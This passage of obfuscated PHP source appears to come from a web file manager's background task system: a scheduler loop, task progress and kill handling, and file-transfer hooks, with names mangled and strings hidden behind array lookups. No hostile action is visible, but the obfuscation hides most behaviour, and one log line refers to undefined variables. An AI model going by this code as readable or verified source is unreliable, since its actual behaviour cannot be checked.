if (isset($¤ö€Çìş[$¾±ŸËè[670]]) && $¤ö€Çìş[$¾±ŸËè[670]]) { Hook::trigger($¾±ŸËè[676], $¤ö€Çìş); continue; } $¥ı°œ¸Ğ = $Œ°Á»Å„->getPathInner($¤ö€Çìş[$¾±ŸËè[87]]); $—Ì²¬· = $ ÖÇ§·é->addFileMake($¥ı°œ¸Ğ, $¤ö€Çìş[$¾±ŸËè[79]], $¤ö€Çìş[$¾±ŸËè[672]], $¤ö€Çìş[$¾±ŸËè[547]], $¤ö€Çìş[$¾±ŸËè[32]], $æ¤¦¼Æ); Hook::trigger($¾±ŸËè[676], $¤ö€Çìş); if (!is_array($—Ì²¬·)) { continue; } $åÉªÀ©¶[] = $—Ì²¬·; } $ ÖÇ§·é->addAll($åÉªÀ©¶); $ó®ıô™ = array($¾±ŸËè[547] => array($¾±ŸËè[7], array_keys($êìÛ ÛÍ))); $Æ‚õˆ‘ = $ ÖÇ§·é->where($ó®ıô™)->select(); $Æ‚õˆ‘ = $Æ‚õˆ‘ ? $Æ‚õˆ‘ : array(); foreach ($Æ‚õˆ‘ as $ìéï™ĞÉ) { if (!isset($êìÛ ÛÍ[$ìéï™ĞÉ[$¾±ŸËè[547]]])) { continue; } $æìï‘µ =& $êìÛ ÛÍ[$ìéï™ĞÉ[$¾±ŸËè[547]]]; foreach ($æìï‘µ as &$å·Î×ã›) { $å·Î×ã›[$¾±ŸËè[541]] = $ìéï™ĞÉ[$¾±ŸËè[541]]; } unset($å·Î×ã›); } $¡ö½ÖÙ€ = array(); foreach ($‡˜«‰ÔŠ as $Ğï„Á¸) { $¡ö½ÖÙ€[$Ğï„Á¸[$¾±ŸËè[32]]] = $Ğï„Á¸; } return $¡ö½ÖÙ€; } } define($_SERVER[¿ğÚ‰±–][677], $_SERVER[¿ğÚ‰±–][678]); $earoxdqtjw = $_SERVER[¿ğÚ‰±–][679]; goto D¹²Šá§‘ñ; F™Åà®Ù‰: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ä”Î´¥Ô =& $_SERVER[¿ğÚ‰±–]; if (self::valueGet($Ä”Î´¥Ô[828]) != $Ä”Î´¥Ô[91]) { return; } if (self::valueGet($Ä”Î´¥Ô[1727]) == $Ä”Î´¥Ô[91]) { $‡ŠÀ´Á = self::valueGet($Ä”Î´¥Ô[1728]); if (time() - $‡ŠÀ´Á > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Ä”Î´¥Ô[1727], $Ä”Î´¥Ô[91]); self::log($Ä”Î´¥Ô[1729] . ACTION . $Ä”Î´¥Ô[1730]); Hook::bind($Ä”Î´¥Ô[1731], $Ä”Î´¥Ô[1732]); $ÆïƒÒş— = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ä”Î´¥Ô[828]) != $Ä”Î´¥Ô[91]) { self::valueSet($Ä”Î´¥Ô[1727], $Ä”Î´¥Ô[228]); self::log($Ä”Î´¥Ô[1733]); die; } $ø¯è éõ = time(); if ($ø¯è éõ - $ÆïƒÒş— >= 60) { self::valueSet(array($Ä”Î´¥Ô[1727] => $Ä”Î´¥Ô[91], $Ä”Î´¥Ô[1728] => $ø¯è éõ)); $ÆïƒÒş— = $ø¯è éõ; } if (!file_exists(USER_SYSTEM . $Ä”Î´¥Ô[1734])) { self::valueSet(array($Ä”Î´¥Ô[1727] => $Ä”Î´¥Ô[228], $Ä”Î´¥Ô[828] => $Ä”Î´¥Ô[228])); self::log($Ä”Î´¥Ô[1735]); die; } $®š £í = file_get_contents(BASIC_PATH . $Ä”Î´¥Ô[1736]); $ì°Š÷”û = KOD_VERSION . $Ä”Î´¥Ô[10] . KOD_VERSION_BUILD; $õ‚•ıÒ¢ = match_text($®š £í, $Ä”Î´¥Ô[1737]) . $Ä”Î´¥Ô[10] . match_text($®š £í, $Ä”Î´¥Ô[1738]); if ($õ‚•ıÒ¢ != $ì°Š÷”û) { self::restart(); self::log("\x73\x74\157\x70\145\x64\x2e\x5b\x76\x65\162\x73\151\x6f\x6e\40\165\x70\x64\x61\x74\145\73{$versionNow}\x20\75\x3e\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ìäÑÔ¦¨ =& $_SERVER[¿ğÚ‰±–]; http_close(); $GLOBALS[$ìäÑÔ¦¨[1739]] = 1; $_SERVER[$ìäÑÔ¦¨[1740]] = $ìäÑÔ¦¨[1741]; $_COOKIE = array(); $GLOBALS[$ìäÑÔ¦¨[1742]] = 1; $GLOBALS[$ìäÑÔ¦¨[1743]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $©»Éƒ‘Ş =& $_SERVER[¿ğÚ‰±–]; http_close(); self::valueSet($©»Éƒ‘Ş[828], $©»Éƒ‘Ş[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($©»Éƒ‘Ş[1727] => $©»Éƒ‘Ş[228], $©»Éƒ‘Ş[828] => $©»Éƒ‘Ş[91])); self::log($©»Éƒ‘Ş[1744]); } public static function taskSwitch() { $¾ëß¨á¯ =& $_SERVER[¿ğÚ‰±–]; $Ÿ…àÆê = self::valueGet($¾ëß¨á¯[828]) == $¾ëß¨á¯[91] ? $¾ëß¨á¯[228] : $¾ëß¨á¯[91]; self::valueSet($¾ëß¨á¯[828], $Ÿ…àÆê); } public static function shutdownEvent() { $–°¨Ï¡ô =& $_SERVER[¿ğÚ‰±–]; self::valueSet($–°¨Ï¡ô[1727], $–°¨Ï¡ô[228]); self::log($–°¨Ï¡ô[1745]); } public static function config($ĞôŸÄ, $Š£„úÖ–) { self::valueSet($_SERVER[¿ğÚ‰±–][828], $ĞôŸÄ); } private static function taskRunAll() { $–ÒÀ‚î =& $_SERVER[¿ğÚ‰±–]; $â”®éâè = timeFloat(); $¼“ı°ˆ« = Model($–ÒÀ‚î[1746])->listData(); $ÛÅ÷ÆÇÕ = count($¼“ı°ˆ«); for ($ÙøÆÄ° = 0; $ÙøÆÄ° < $ÛÅ÷ÆÇÕ; $ÙøÆÄ°++) { $ñ´ê–´‡ = $¼“ı°ˆ«[$ÙøÆÄ°]; if (!$ñ´ê–´‡[$–ÒÀ‚î[475]] || $ñ´ê–´‡[$–ÒÀ‚î[1747]] != $–ÒÀ‚î[91]) { continue; } if (!self::taskTimeCheck($ñ´ê–´‡)) { continue; } self::taskRun($ñ´ê–´‡); } Hook::trigger($–ÒÀ‚î[1748]); self::taskQueueRun($â”®éâè); } private static function taskQueueRun($şİĞ êâ) { $¥ÅİıËŠ = 10; while (!0) { $š÷çÓ‰· = TaskQueue::run(); if ($š÷çÓ‰· === !1) { break; } if (timeFloat() - $şİĞ êâ >= $¥ÅİıËŠ) { break; } } } private static function taskTimeCheck($ë÷ô¡ê) { $à¶œ¸è¤ =& $_SERVER[¿ğÚ‰±–]; $¬ˆ¡ïÔò = json_decode($ë÷ô¡ê[$à¶œ¸è¤[206]], !0); $‹ò®¶Œ¦ = intval($ë÷ô¡ê[$à¶œ¸è¤[1728]]); $ôš“ú™ = strtotime($à¶œ¸è¤[1749] . $¬ˆ¡ïÔò[$à¶œ¸è¤[1750]] . $à¶œ¸è¤[1751]) - strtotime($à¶œ¸è¤[1752]); $ç«É®£» = time() - strtotime(date($à¶œ¸è¤[1753]) . $à¶œ¸è¤[1754]); $õÕ·ËÚø = $ç«É®£» >= $ôš“ú™ && $ç«É®£» <= $ôš“ú™ + 3600; switch ($¬ˆ¡ïÔò[$à¶œ¸è¤[33]]) { case $à¶œ¸è¤[1755]: if (time() - $‹ò®¶Œ¦ < 3600 * 24 * 30) { return !1; } if ($¬ˆ¡ïÔò[$à¶œ¸è¤[1755]] == date($à¶œ¸è¤[1756]) && $õÕ·ËÚø) { return !0; } break; case $à¶œ¸è¤[1757]: if (time() - $‹ò®¶Œ¦ < 3600 * 24 * 7) { return !1; } $Œ¡±ç±¦ = date($à¶œ¸è¤[1758]) == 0 ? 7 : date($à¶œ¸è¤[1758]); if ($¬ˆ¡ïÔò[$à¶œ¸è¤[1757]] == $Œ¡±ç±¦ && $õÕ·ËÚø) { return !0; } break; case $à¶œ¸è¤[1750]: if (time() - $‹ò®¶Œ¦ < 3600 * 24) { return !1; } if ($õÕ·ËÚø) { return !0; } break; case $à¶œ¸è¤[1759]: if (time() - $‹ò®¶Œ¦ >= floatval($¬ˆ¡ïÔò[$à¶œ¸è¤[1759]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ÁŞ°Ô¢¦ =& $_SERVER[¿ğÚ‰±–]; static $Ì‘ğÓë = 0; $à‹èäö£ = 300; if (!$Ì‘ğÓë) { $Ì‘ğÓë = time(); } if (time() - $Ì‘ğÓë < $à‹èäö£) { return; } $Ì‘ğÓë = time(); $¾Ëàé»ë = Model($ÁŞ°Ô¢¦[577])->db($ÁŞ°Ô¢¦[12]); if ($¾Ëàé»ë) { $¾Ëàé»ë->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ÁŞ°Ô¢¦[1760], $ÁŞ°Ô¢¦[1761]); die; } } public static function taskRun($¯·³Å®÷) { $Øš«¾´ =& $_SERVER[¿ğÚ‰±–]; self::log($Øš«¾´[1762] . $¯·³Å®÷[$Øš«¾´[475]] . $Øš«¾´[1763] . $¯·³Å®÷[$Øš«¾´[32]] . $Øš«¾´[1764] . $¯·³Å®÷[$Øš«¾´[1765]]); Model($Øš«¾´[1746])->run($¯·³Å®÷[$Øš«¾´[475]]); $¸ÚŞ‘¢Ú = timeFloat(); $©ô›‡‡Ş = $Øš«¾´[12]; switch ($¯·³Å®÷[$Øš«¾´[33]]) { case $Øš«¾´[383]: $şİıâ‘™ = url_request($¯·³Å®÷[$Øš«¾´[1765]], $Øš«¾´[261], !1, !1, !1, !1, 10); if ($şİıâ‘™[$Øš«¾´[828]]) { $©ô›‡‡Ş = strlen($şİıâ‘™[$Øš«¾´[1294]]); } break; case $Øš«¾´[260]: $©ô›‡‡Ş = Hook::apply($¯·³Å®÷[$Øš«¾´[1765]]); default: break; } Model($Øš«¾´[1766])->add(array($Øš«¾´[1767] => $Øš«¾´[12], $Øš«¾´[1768] => $Øš«¾´[228], $Øš«¾´[33] => $Øš«¾´[1769] . $¯·³Å®÷[$Øš«¾´[475]], $Øš«¾´[1770] => json_encode(array($Øš«¾´[32] => $¯·³Å®÷[$Øš«¾´[32]], $Øš«¾´[1771] => timeFloat() - $¸ÚŞ‘¢Ú, $Øš«¾´[369] => $©ô›‡‡Ş)))); $º¼Í½Ò× = $©ô›‡‡Ş ? $Øš«¾´[1772] . $©ô›‡‡Ş : $Øš«¾´[12]; self::log($Øš«¾´[1773] . $¯·³Å®÷[$Øš«¾´[475]] . $Øš«¾´[178] . $º¼Í½Ò×); return !0; } public static function valueGet($é®ñãó±) { $ÔÔ‘·‹ =& $_SERVER[¿ğÚ‰±–]; $£½¹ÚøÓ = $ÔÔ‘·‹[1774]; $Åº¥ô²± = Model($ÔÔ‘·‹[508])->get($é®ñãó±, $£½¹ÚøÓ); if (is_null($Åº¥ô²±)) { Model($ÔÔ‘·‹[508])->set($ÔÔ‘·‹[828], $ÔÔ‘·‹[91], $£½¹ÚøÓ); Model($ÔÔ‘·‹[508])->set($ÔÔ‘·‹[1727], $ÔÔ‘·‹[228], $£½¹ÚøÓ); $Åº¥ô²± = Model($ÔÔ‘·‹[508])->get($é®ñãó±, $£½¹ÚøÓ); } return $Åº¥ô²±; } private static function valueSet($»ÇÕÜ›Ê, $âÉ¹ ôÊ = false) { $„ÌÈã©• =& $_SERVER[¿ğÚ‰±–]; $ÄÅºİô„ = $„ÌÈã©•[1775]; CacheLock::lock($ÄÅºİô„); $Š‚Á¥Ò® = Model($„ÌÈã©•[508])->set($»ÇÕÜ›Ê, $âÉ¹ ôÊ, $„ÌÈã©•[1774]); CacheLock::unlock($ÄÅºİô„); return $Š‚Á¥Ò®; } protected static function log($êØ„¨µ) { write_log($êØ„¨µ, $_SERVER[¿ğÚ‰±–][1761]); } private static function cacheClear() { $ûÎƒÓæ =& $_SERVER[¿ğÚ‰±–]; Cache::clearMemory(Model($ûÎƒÓæ[508])->cacheKey($ûÎƒÓæ[1774])); Cache::clearMemory(Model($ûÎƒÓæ[508])->cacheKey($ûÎƒÓæ[1776])); Model($ûÎƒÓæ[1746])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\162\165\x6e\156\151\x6e\147"; const STATYS_KILL = "\153\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ĞÉëà¬, $ÏÙÆ×Şæ = '', $ßÈ Ø´í = 0, $…‰ÇÍéƒ = '') { $—•“ìû =& $_SERVER[¿ğÚ‰±–]; if (self::get($ĞÉëà¬)) { return; } $this->task = array($—•“ìû[475] => $ĞÉëà¬, $—•“ìû[1777] => USER_ID, $—•“ìû[1666] => $…‰ÇÍéƒ, $—•“ìû[526] => $—•“ìû[12], $—•“ìû[33] => $ÏÙÆ×Şæ, $—•“ìû[1150] => $—•“ìû[12], $—•“ìû[1148] => $ßÈ Ø´í, $—•“ìû[1778] => 0, $—•“ìû[1779] => 0, $—•“ìû[1780] => 0, $—•“ìû[1781] => timeFloat(), $—•“ìû[1782] => 0, $—•“ìû[1783] => 0, $—•“ìû[1784] => 0, $—•“ìû[1785] => 0, $—•“ìû[828] => $—•“ìû[1727]); $GLOBALS[$—•“ìû[1786]] = 1; Hook::bind($—•“ìû[1731], array($this, $—•“ìû[1787])); Hook::bind($—•“ìû[1788], array($this, $—•“ìû[1789])); $this->startAfter(); Hook::trigger($—•“ìû[1790], $this->task); $this->task[$—•“ìû[1783]] = timeFloat(); } public function end($Ğï¤ò   = '') { $«—•÷ûÙ =& $_SERVER[¿ğÚ‰±–]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$«—•÷ûÙ[1783]]) { self::valueSet($this->task[$«—•÷ûÙ[475]], !1); } $this->isEnd = !0; if ($Ğï¤ò  ) { $this->task[$«—•÷ûÙ[526]] = $Ğï¤ò  ; } self::log($«—•÷ûÙ[1791] . $this->task[$«—•÷ûÙ[475]] . $«—•÷ûÙ[1792] . sprintf($«—•÷ûÙ[928], timeFloat() - $this->task[$«—•÷ûÙ[1781]]) . $«—•÷ûÙ[1793]); Hook::unbind($«—•÷ûÙ[1731], array($this, $«—•÷ûÙ[1787])); Hook::unbind($«—•÷ûÙ[1788], array($this, $«—•÷ûÙ[1789])); $this->endAfter(); $…ïäãŠ÷ = $this->task; $this->task = !1; Hook::trigger($«—•÷ûÙ[1794], $…ïäãŠ÷); } public function update($âŞÆ¤Àø = 0, $“ıäÅ÷• = false) { $Á–ÂÚá“ =& $_SERVER[¿ğÚ‰±–]; $ŸÎãò­± =& $this->task; if (!$ŸÎãò­±) { return; } $ŸÎãò­±[$Á–ÂÚá“[1778]] += $âŞÆ¤Àø; $ŸÎãò­±[$Á–ÂÚá“[1782]] = timeFloat(); if ($ŸÎãò­±[$Á–ÂÚá“[1148]]) { if ($ŸÎãò­±[$Á–ÂÚá“[1148]] < $ŸÎãò­±[$Á–ÂÚá“[1778]]) { $ŸÎãò­±[$Á–ÂÚá“[1148]] = $ŸÎãò­±[$Á–ÂÚá“[1778]]; } $ğã²ª¶È = timeFloat() - $ŸÎãò­±[$Á–ÂÚá“[1781]] - $ŸÎãò­±[$Á–ÂÚá“[1784]]; if ($ğã²ª¶È <= 0) { $ğã²ª¶È = 0.001; } $ŸÎãò­±[$Á–ÂÚá“[1779]] = $ŸÎãò­±[$Á–ÂÚá“[1778]] / $ŸÎãò­±[$Á–ÂÚá“[1148]]; $ŸÎãò­±[$Á–ÂÚá“[1780]] = $ŸÎãò­±[$Á–ÂÚá“[1778]] / $ğã²ª¶È; if ($ŸÎãò­±[$Á–ÂÚá“[1779]] > 0) { $ŸÎãò­±[$Á–ÂÚá“[1785]] = $ğã²ª¶È * (1 - $ŸÎãò­±[$Á–ÂÚá“[1779]]) / $ŸÎãò­±[$Á–ÂÚá“[1779]]; } $ŸÎãò­±[$Á–ÂÚá“[1785]] = $ŸÎãò­±[$Á–ÂÚá“[1785]] <= 0 ? 0 : $ŸÎãò­±[$Á–ÂÚá“[1785]]; } $this->updateAfter(); $Û€² Ù‚ = 0.2; if (timeFloat() - $ŸÎãò­±[$Á–ÂÚá“[1783]] < $Û€² Ù‚ && !$“ıäÅ÷•) { return; } $øùƒÉïö = self::get($ŸÎãò­±[$Á–ÂÚá“[475]]); $Õ§‡ÎĞ = $øùƒÉïö[$Á–ÂÚá“[828]]; if ($Õ§‡ÎĞ == self::STATYS_KILL) { $îÊëµ¿ = array($Á–ÂÚá“[1795] => LNG($Á–ÂÚá“[1796]), $Á–ÂÚá“[1304] => !1); Cache::set($Á–ÂÚá“[1797] . $this->task[$Á–ÂÚá“[475]], $îÊëµ¿, 30); $this->onKill(); $this->end(); die; } else { if ($Õ§‡ÎĞ == self::STATYS_STOP) { $‹ˆ¸¦²í = 2; $øùƒÉïö[$Á–ÂÚá“[1784]] += $‹ˆ¸¦²í; self::valueSet($ŸÎãò­±[$Á–ÂÚá“[475]], $øùƒÉïö); sleep($‹ˆ¸¦²í); $this->update(); return; } } $ŸÎãò­±[$Á–ÂÚá“[828]] = $Õ§‡ÎĞ ? $Õ§‡ÎĞ : $ŸÎãò­±[$Á–ÂÚá“[828]]; $ŸÎãò­±[$Á–ÂÚá“[1784]] = $øùƒÉïö[$Á–ÂÚá“[1784]] ? $øùƒÉïö[$Á–ÂÚá“[1784]] : 0; $ŸÎãò­±[$Á–ÂÚá“[1783]] = timeFloat(); Hook::trigger($Á–ÂÚá“[1798], $ŸÎãò­±); self::valueSet($ŸÎãò­±[$Á–ÂÚá“[475]], $ŸÎãò­±); } public function onKillSet($İ‰Êôã, $ÜĞ­• ¦ = array()) { $this->onKillCall = array($İ‰Êôã, $ÜĞ­• ¦); } public function onKill() { $©”õÄŠ® =& $_SERVER[¿ğÚ‰±–]; self::log($©”õÄŠ®[1791] . $this->task[$©”õÄŠ®[475]] . $©”õÄŠ®[1799]); Hook::trigger($©”õÄŠ®[1800], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ûİò¯¦ì) { $°‡áùœ¿ =& $_SERVER[¿ğÚ‰±–]; Cache::set($°‡áùœ¿[1797] . $this->task[$°‡áùœ¿[475]], $Ûİò¯¦ì, 60); return $Ûİò¯¦ì; } public static function get($¿¿ƒâÂñ) { $êçÈï•½ =& $_SERVER[¿ğÚ‰±–]; $ùŞñöÆ = self::valueGet($¿¿ƒâÂñ); if (is_array($ùŞñöÆ) && $ùŞñöÆ[$êçÈï•½[1801]]) { $òê²†º’ = ActionApply($ùŞñöÆ[$êçÈï•½[1801]], array($ùŞñöÆ)); $ùŞñöÆ = is_array($òê²†º’) ? $òê²†º’ : $ùŞñöÆ; } return $ùŞñöÆ; } public static function listData() { $èœÃ£˜ = self::valueGet(); return array_sort_by($èœÃ£˜, $_SERVER[¿ğÚ‰±–][1781], !0); } public static function kill($Áµ ¸ˆÛ) { return self::changeStatus($Áµ ¸ˆÛ, self::STATYS_KILL); } public static function stop($ˆÙ›åÖ) { return self::changeStatus($ˆÙ›åÖ, self::STATYS_STOP); } public static function restart($ÊÙåÀ‰) { return self::changeStatus($ÊÙåÀ‰, self::STATYS_RUNNING); } public static function killAll() { $î‡’İñ˜ =& $_SERVER[¿ğÚ‰±–]; $’£¡Ù”° = self::listData(); foreach ($’£¡Ù”° as $ê£³¤ª) { self::kill($ê£³¤ª[$î‡’İñ˜[475]]); } sleep(2); foreach ($’£¡Ù”° as $ê£³¤ª) { self::valueSet($ê£³¤ª[$î‡’İñ˜[475]], !1); } } private static function changeStatus($±ı¬²¦, $šÉšÁ–ı) { $¯óâ¨¸‚ =& $_SERVER[¿ğÚ‰±–]; $ŞÄÑ¯è = self::valueGet($±ı¬²¦); if (!$ŞÄÑ¯è) { return !1; } $ŞÄÑ¯è[$¯óâ¨¸‚[828]] = $šÉšÁ–ı; self::valueSet($±ı¬²¦, $ŞÄÑ¯è); self::log($¯óâ¨¸‚[1802] . $ŞÄÑ¯è[$¯óâ¨¸‚[475]] . $¯óâ¨¸‚[1803] . $šÉšÁ–ı); return !0; } public static function valueGet($ ¡’Åß§ = false) { $Š×ˆ¥ƒñ =& $_SERVER[¿ğÚ‰±–]; if ($ ¡’Åß§) { $ïü©» = Model($Š×ˆ¥ƒñ[520])->where(array($Š×ˆ¥ƒñ[97] => $ ¡’Åß§, $Š×ˆ¥ƒñ[33] => $Š×ˆ¥ƒñ[1157]))->find(); return $ïü©» ? json_decode($ïü©»[$Š×ˆ¥ƒñ[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ ñ–ÏË¡ = false) { $çÊ³¹Î„ =& $_SERVER[¿ğÚ‰±–]; $—É²—Ÿ‡ = array($çÊ³¹Î„[33] => $çÊ³¹Î„[1157]); if ($ ñ–ÏË¡) { $—É²—Ÿ‡[$çÊ³¹Î„[1777]] = $ ñ–ÏË¡; } $œø»­šÙ = Model($çÊ³¹Î„[520])->where($—É²—Ÿ‡)->select(); $œø»­šÙ = $œø»­šÙ ? $œø»­šÙ : array(); foreach ($œø»­šÙ as $í°½’õŒ => $§è¡â¾Â) { $œø»­šÙ[$í°½’õŒ] = json_decode($§è¡â¾Â[$çÊ³¹Î„[450]], !0); } return $œø»­šÙ; } public static function valueSet($¥ıŠïÁĞ, $Ö´İ¨À) { $¬‹Í‹Ã =& $_SERVER[¿ğÚ‰±–]; if (!$Ö´İ¨À) { return Model($¬‹Í‹Ã[520])->where(array($¬‹Í‹Ã[97] => $¥ıŠïÁĞ, $¬‹Í‹Ã[33] => $¬‹Í‹Ã[1157]))->delete(); } $Ø¢ô°·’ = json_encode($Ö´İ¨À); if (!$Ø¢ô°·’) { ob_start(); var_dump($Ö´İ¨À); $Ê·ˆ‘©í = ob_get_clean(); self::log($¬‹Í‹Ã[1804] . json_encode_force($Ê·ˆ‘©í)); } if (!$¥ıŠïÁĞ || !$Ö´İ¨À[$¬‹Í‹Ã[475]]) { return !1; } $Å©®•²² = array($¬‹Í‹Ã[33] => $¬‹Í‹Ã[1157], $¬‹Í‹Ã[1777] => USER_ID, $¬‹Í‹Ã[97] => $¥ıŠïÁĞ, $¬‹Í‹Ã[450] => $Ø¢ô°·’); $¬ÎÌĞ¹Ñ = $¬‹Í‹Ã[1805]; CacheLock::lock($¬ÎÌĞ¹Ñ); Model($¬‹Í‹Ã[520])->add($Å©®•²², array(), !0); CacheLock::unlock($¬ÎÌĞ¹Ñ); } public static function log($¢õšçãš) { if (!GLOBAL_DEBUG) { return; } write_log($¢õšçãš, $_SERVER[¿ğÚ‰±–][1806]); } } class TaskFileTransfer extends Task { protected function startAfter() { $­è‘¼‚Š =& $_SERVER[¿ğÚ‰±–]; $ÉÊ«ÈÏÈ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($­è‘¼‚Š[1807], array($this, $­è‘¼‚Š[1808])); Hook::bind($­è‘¼‚Š[1315], array($this, $­è‘¼‚Š[1809])); Hook::bind($­è‘¼‚Š[1810], array($this, $­è‘¼‚Š[1811])); Hook::bind($­è‘¼‚Š[668], array($this, $­è‘¼‚Š[1812])); Hook::bind($­è‘¼‚Š[669], array($this, $­è‘¼‚Š[1813])); Hook::bind($­è‘¼‚Š[675], array($this, $­è‘¼‚Š[1814])); Hook::bind($­è‘¼‚Š[676], array($this, $­è‘¼‚Š[1815])); Hook::bind($­è‘¼‚Š[671], array($this, $­è‘¼‚Š[1816])); Hook::bind($­è‘¼‚Š[673], array($this, $­è‘¼‚Š[1817])); Hook::bind($­è‘¼‚Š[637], array($this, $­è‘¼‚Š[1818])); Hook::bind($­è‘¼‚Š[634], array($this, $­è‘¼‚Š[1818])); Hook::bind($­è‘¼‚Š[639], array($this, $­è‘¼‚Š[1818])); Hook::bind($­è‘¼‚Š[641], array($this, $­è‘¼‚Š[1818])); Hook::bind($­è‘¼‚Š[643], array($this, $­è‘¼‚Š[1818])); Hook::bind($­è‘¼‚Š[1819], array($this, $­è‘¼‚Š[1820])); Hook::bind($­è‘¼‚Š[659], array($this, $­è‘¼‚Š[1821])); $this->sourceModelCopyFlag = !1; Hook::bind($­è‘¼‚Š[1822], array($this, $­è‘¼‚Š[1823])); Hook::bind($­è‘¼‚Š[1824], array($this, $­è‘¼‚Š[1825])); Hook::bind($­è‘¼‚Š[1826], array($this, $­è‘¼‚Š[1827])); $ÉÊ«ÈÏÈ[$­è‘¼‚Š[1828]] = LNG($­è‘¼‚Š[1829]); $ÉÊ«ÈÏÈ[$­è‘¼‚Š[1830]] = 0; $ÉÊ«ÈÏÈ[$­è‘¼‚Š[1831]] = 0; $ÉÊ«ÈÏÈ[$­è‘¼‚Š[1150]] = $­è‘¼‚Š[12]; $ÉÊ«ÈÏÈ[$­è‘¼‚Š[1832]] = $­è‘¼‚Š[12]; $ÉÊ«ÈÏÈ[$­è‘¼‚Š[1833]] = 0; $ÉÊ«ÈÏÈ[$­è‘¼‚Š[1834]] = 0; $ÉÊ«ÈÏÈ[$­è‘¼‚Š[1835]] = 0; if (!$ÉÊ«ÈÏÈ[$­è‘¼‚Š[1666]]) { $ÉÊ«ÈÏÈ[$­è‘¼‚Š[1666]] = LNG($­è‘¼‚Š[1836]); } } protected function endAfter() { $¬œÕ¶ã½ =& $_SERVER[¿ğÚ‰±–]; Hook::unbind($¬œÕ¶ã½[1807], array($this, $¬œÕ¶ã½[1808])); Hook::unbind($¬œÕ¶ã½[1315], array($this, $¬œÕ¶ã½[1809])); Hook::unbind($¬œÕ¶ã½[1810], array($this, $¬œÕ¶ã½[1811])); Hook::unbind($¬œÕ¶ã½[668], array($this, $¬œÕ¶ã½[1812])); Hook::unbind($¬œÕ¶ã½[669], array($this, $¬œÕ¶ã½[1813])); Hook::unbind($¬œÕ¶ã½[675], array($this, $¬œÕ¶ã½[1814])); Hook::unbind($¬œÕ¶ã½[676], array($this, $¬œÕ¶ã½[1815])); Hook::unbind($¬œÕ¶ã½[671], array($this, $¬œÕ¶ã½[1816])); Hook::unbind($¬œÕ¶ã½[673], array($this, $¬œÕ¶ã½[1817])); Hook::unbind($¬œÕ¶ã½[637], array($this, $¬œÕ¶ã½[1818])); Hook::unbind($¬œÕ¶ã½[634], array($this, $¬œÕ¶ã½[1818])); Hook::unbind($¬œÕ¶ã½[639], array($this, $¬œÕ¶ã½[1818])); Hook::unbind($¬œÕ¶ã½[641], array($this, $¬œÕ¶ã½[1818])); Hook::unbind($¬œÕ¶ã½[643], array($this, $¬œÕ¶ã½[1818])); Hook::unbind($¬œÕ¶ã½[1819], array($this, $¬œÕ¶ã½[1820])); Hook::unbind($¬œÕ¶ã½[659], array($this, $¬œÕ¶ã½[1821])); Hook::unbind($¬œÕ¶ã½[1822], array($this, $¬œÕ¶ã½[1823])); Hook::unbind($¬œÕ¶ã½[1824], array($this, $¬œÕ¶ã½[1825])); Hook::unbind($¬œÕ¶ã½[1826], array($this, $¬œÕ¶ã½[1827])); } public function copyMoveStart($ƒæşº×ä, $’ò“­˜ı, $ˆÜŠ¼œ, $º¬¯¬Ñ) { $²÷®Êğ» =& $_SERVER[¿ğÚ‰±–]; self::log($²÷®Êğ»[1837] . $’ò“­˜ı . $²÷®Êğ»[73] . $º¬¯¬Ñ); $¶©ÌÄ—® = rtrim(TEMP_FILES, $²÷®Êğ»[8]); if (substr($’ò“­˜ı, 0, strlen($¶©ÌÄ—®)) == $¶©ÌÄ—®) { return; } if (substr($º¬¯¬Ñ, 0, strlen($¶©ÌÄ—®)) == $¶©ÌÄ—®) { return; } $“Ç˜é½ê =& $this->task; $“Ç˜é½ê[$²÷®Êğ»[1838]] = KodIO::transferType($ƒæşº×ä, $ˆÜŠ¼œ); $this->update(); } public function updateAfter() { $¤î©‘¶› =& $_SERVER[¿ğÚ‰±–]; $®åõà½ =& $this->task; if (!$®åõà½[$¤î©‘¶›[841]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($®åõà½[$¤î©‘¶›[1838]] == $¤î©‘¶›[1408]) { return; } self::updateTask($®åõà½); } private static function updateTask(&$®¯á¯¶) { $Îğ‰”úñ =& $_SERVER[¿ğÚ‰±–]; if ($®¯á¯¶[$Îğ‰”úñ[1838]] == $Îğ‰”úñ[1286] || $®¯á¯¶[$Îğ‰”úñ[1838]] == $Îğ‰”úñ[110]) { if ($®¯á¯¶[$Îğ‰”úñ[1832]]) { $®¯á¯¶[$Îğ‰”úñ[1835]] = $®¯á¯¶[$Îğ‰”úñ[1834]] + $®¯á¯¶[$Îğ‰”úñ[1831]]; } } else { if ($®¯á¯¶[$Îğ‰”úñ[1838]] == $Îğ‰”úñ[1409]) { if ($®¯á¯¶[$Îğ‰”úñ[1832]] == $Îğ‰”úñ[1286]) { $®¯á¯¶[$Îğ‰”úñ[1835]] = $®¯á¯¶[$Îğ‰”úñ[1834]] + $®¯á¯¶[$Îğ‰”úñ[1831]] * 0.5; } else { if ($®¯á¯¶[$Îğ‰”úñ[1832]] == $Îğ‰”úñ[110]) { $®¯á¯¶[$Îğ‰”úñ[1835]] = $®¯á¯¶[$Îğ‰”úñ[1834]] + $®¯á¯¶[$Îğ‰”úñ[1830]] * 0.5 + $®¯á¯¶[$Îğ‰”úñ[1831]] * 0.5; } } } } $®¯á¯¶[$Îğ‰”úñ[1779]] = $®¯á¯¶[$Îğ‰”úñ[1835]] / $®¯á¯¶[$Îğ‰”úñ[841]]; 